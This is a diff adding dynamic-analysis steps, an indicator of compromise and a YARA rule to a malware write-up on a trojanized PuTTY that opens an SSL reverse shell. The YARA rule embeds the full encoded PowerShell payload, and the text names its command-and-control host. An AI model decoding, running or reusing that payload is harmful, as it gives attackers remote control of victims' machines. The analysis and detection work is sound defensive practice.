@@ -122,10 +122,73 @@ The decoded content is shown below which seems to be a reverse shell to bonus2.c
     
     powerfun -Command reverse -Sslcon true
 
-This proves that the putty is trojanized as RAT. Let verify more by dynamically analyzing it in the next section.
+This proves that the putty is trojanized as RAT. Let verify it more by dynamically analyzing it in the next section.
 
 <br>
 
 ### Dynamic Analysis:
 
+The sample was then executed for dynamic analysis. When checking the processes in Process Monitor, the putty sample on execution spawn a powershell child process as shown below.
 
+<image src="../Images/putty.exe4.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+On further checking the powershell process, the command passed to it is the same that was identified in the static analysis during string analysis. 
+
+<image src="../Images/putty.exe5.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+As we know from static analysis that obfuscated content passed to powershell will try to establish a reverse shell to bonus2[.]corporatebonusapplication[.]local over port 8443. When checking the Wireshark capture, it was found that it was trying to reach bonus2[.]corporatebonusapplication[.]local. Since the lab was isolated with no network simulation active, the resolution to that domain fail making the sample unable to reach it.
+
+<image src="../Images/putty.exe6.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+<br>
+
+Now in Remnux machine, INetSim was runned for network simulation. 
+
+<image src="../Images/putty.exe7.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+Also in Remnux machine, port 8443 was listened using the netcat. 
+
+<image src="../Images/putty.exe8.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+After that the sample was executed again. After the execution of sample, a connection was established from the infected Windows machine on the netcat on Remnux machine. Some message was displayed along with some gibberish values. And on entering a command 'whoami', the connection was terminated as shown below.
+
+<image src="../Images/putty.exe9.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+This may be because of SSL due to which it cannot handle the connection. The Wireshark capture also verifies the SSL connection,
+
+<image src="../Images/putty.exe10.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+To overcome this, netcat was again used to listen along with ssl option to handle this connection as shown below.
+
+<image src="../Images/putty.exe11.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+Then the sample was executed again. This time the SSL connection was handled by netcat and a fully functional reverse shell connection was established. On entering the command 'whoami', it returned the user of the infected machine verifying it to be a RAT.
+
+<image src="../Images/putty.exe12.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >
+
+<br>
+
+# Indicator of Compromise:
+
+## Network-based Indicators:
+- bonus2[.]corporatebonusapplication[.]local
+
+<br>
+
+# Detection with YARA Rule:
+
+    rule SillyPutty{
+        meta:
+                author= "Venus Chhantel"
+                description= "RAT.Unknown2.exe"
+        strings:
+
+                $C2 = "bonus2[.]corporatebonusapplication[.]local"
+                $payload = "H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=="
+    
+        condition:
+                uint16(0) == 0x5A4D and
+                (
+                        $C2 and $payload
+                )
+        }
